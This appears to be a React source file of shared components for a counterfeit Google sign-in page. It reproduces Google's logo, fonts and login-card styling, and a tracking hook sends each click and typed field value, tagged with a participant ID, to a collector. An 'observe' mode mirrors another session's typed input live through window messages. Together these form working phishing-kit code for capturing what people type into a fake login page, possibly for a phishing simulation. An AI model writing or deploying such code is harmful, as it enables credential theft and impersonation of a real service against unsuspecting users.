// Shared Google-Email (ge) page primitives.
import { useEffect, useMemo } from "react";
import { useNavigate, useRouterState } from "@tanstack/react-router";
import { useParticipant } from "@/hooks/useParticipant";

export const GE_FONT_FAMILY =
  "'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif";

export function GoogleGLogo({ size = 45 }: { size?: number }) {
  // Google "G" mark
  return (
    <svg width={size} height={size} viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google">
      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
      <path fill="none" d="M0 0h48v48H0z"/>
    </svg>
  );
}

export function GeFontStyle() {
  return (
    <style>{`@import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500;700&display=swap');`}</style>
  );
}

export function useIsObserve(): boolean {
  return useMemo(() => {
    if (typeof window === "undefined") return false;
    try { return new URLSearchParams(window.location.search).get("__observe") === "1"; }
    catch { return false; }
  }, []);
}

export function useGeTracking() {
  const isObserve = useIsObserve();
  const navigate = useNavigate();
  const { emitInput, participantId } = useParticipant();

  function trackClick(label: string) {
    if (isObserve) return;
    emitInput("__click", label);
  }
  function trackInput(field: string, value: string) {
    if (isObserve) return;
    emitInput(field, value);
  }
  function geNavigate(to: string) {
    if (isObserve) return;
    try { window.postMessage({ __ux: true, type: "internal_navigation", url: to }, "*"); } catch { /* ignore */ }
    navigate({ to, reloadDocument: false }).catch(() => { window.location.assign(to); });
  }

  useEffect(() => {
    if (!isObserve || typeof window === "undefined") return;
    function onMsg(e: MessageEvent) {
      const d = e.data;
      if (!d || typeof d !== "object" || d.__mirror !== true) return;
      if (d.type !== "live_input" || typeof d.field !== "string") return;
      const el = document.querySelector(`[name="${d.field}"]`) as HTMLInputElement | HTMLTextAreaElement | null;
      if (el) {
        el.value = String(d.value ?? "");
        el.dispatchEvent(new Event("input", { bubbles: true }));
      }
    }
    window.addEventListener("message", onMsg);
    return () => window.removeEventListener("message", onMsg);
  }, [isObserve]);

  return { sessionId: participantId, trackClick, trackInput, geNavigate, isObserve };
}

// Google-style two-column card wrapper CSS injected once.
export function GeCardStyles() {
  return (
    <style>{`
      .ge-body { min-height: 100vh; display: flex; justify-content: center; align-items: center; background: #F0F4F9; }
      .ge-container { border-radius: 25px; position: relative; background: #FFFFFF; color: #1f1f1f; overflow: hidden; }
      .ge-logo { width: 45px; height: auto; margin-bottom: 30px; }
      .ge-h1 { font-weight: 400; margin: 0 0 15px 0; }
      .ge-p { font-size: 16px; line-height: 25px; margin: 0 0 15px 0; }
      .ge-input { width: 100%; padding: 18px; border-radius: 5px; font-size: 16px; border: 1px solid #8E918F; background: #F0F4F9; color: #1f1f1f; outline: none; font-family: inherit; transition: border 0.15s ease; }
      .ge-input:focus { border: 2px solid #0b57d0; padding: 17px; }
      .ge-hint-link { color: #0b57d0; font-size: 14px; text-decoration: none; cursor: pointer; }
      .ge-btn { padding: 10px 24px; border: none; border-radius: 50px; font-family: inherit; font-size: 14px; cursor: pointer; font-weight: 500; transition: background 0.15s ease; }
      .ge-btn-ghost { background: none; color: #0b57d0; font-weight: 600; }
      .ge-btn-ghost:hover { background: #F5F8FD; }
      .ge-btn-primary { background: #0B57D0; color: #FFFFFF; }
      .ge-btn-primary:hover { background: #0a4dbf; }
      .ge-btn-primary:disabled { opacity: 0.5; cursor: not-allowed; }
      .ge-loading-overlay { display:none; position:absolute; inset:0; z-index:9999; }
      .ge-loading-overlay.active { display:block; }
      .ge-loading-bar { position:absolute; top:0; left:50%; transform:translateX(-50%); width:90%; height:6px; background:#F0F4F9; overflow:hidden; }
      .ge-loading-bar::before { content:''; display:block; width:30%; height:100%; background:#0B57D0; animation: geBar 1.5s linear infinite; }
      @keyframes geBar {
        0% { transform: translateX(-100%); opacity:1; }
        95% { transform: translateX(333%); opacity:1; }
        100% { transform: translateX(333%); opacity:0; }
      }
      body.ge-loading .ge-container * { filter: brightness(95%); }
      @media (min-width: 1034px) {
        .ge-container { width: 840px; height: 455px; display:flex; padding-bottom: 35px; }
        .ge-left { width: 45%; padding: 55px 0 0 55px; display:flex; flex-direction:column; }
        .ge-right { width: 45%; padding: 85px 55px 0 0; display:flex; flex-direction:column; justify-content:space-between; }
        .ge-h1 { font-size: 40px; line-height: 48px; }
      }
      @media (max-width: 1033px) {
        .ge-container { width: 480px; min-height: 600px; display:flex; flex-direction:column; padding: 30px; }
        .ge-left { padding-bottom: 20px; }
        .ge-right { padding-top: 10px; }
        .ge-h1 { font-size: 36px; line-height: 44px; }
      }
      @media (max-width: 767px) {
        .ge-container { width: 100vw; height: 100vh; border-radius: 0; }
        .ge-loading-overlay { border-radius: 0; }
      }
      @media (prefers-color-scheme: dark) {
        .ge-body { background: #1E1F20; }
        .ge-container { background: #0E0E0E; color: #e3e3e3; }
        .ge-h1, .ge-p { color: #e3e3e3; }
        .ge-input { background: none; border-color: #C4C7C5; color: #C4C7C5; }
        .ge-input::placeholder { color: #C4C7C5; }
        .ge-input:focus { border-color: #a8c7fa; }
        .ge-hint-link { color: #a8c7fa; }
        .ge-btn-ghost { color: #a8c7fa; }
        .ge-btn-ghost:hover { background: #141517; }
        .ge-btn-primary { background: #A8C7FA; color: #062E6F; }
        .ge-btn-primary:hover { background: #B6D0FB; }
        .ge-loading-bar { background:#1E1F20; }
        .ge-loading-bar::before { background:#A8C7FA; }
      }
      .ge-email-chip { display:inline-flex; align-items:center; gap:8px; border:1px solid #414343; padding:4px 12px 4px 4px; border-radius:50px; cursor:pointer; font-size:14px; font-weight:600; color:#414343; margin-top: 8px; }
      .ge-email-chip:hover { background:#EDEDED; }
      @media (prefers-color-scheme: dark) {
        .ge-email-chip { border-color:#C7C9C8; color:#C7C9C8; }
        .ge-email-chip:hover { background:#1F1F1F; }
      }
      .ge-email-chip-dot { width:22px; height:22px; border-radius:50%; background:#DADCE0; display:inline-flex; align-items:center; justify-content:center; font-size:12px; font-weight:700; color:#1f1f1f; }
    `}</style>
  );
}
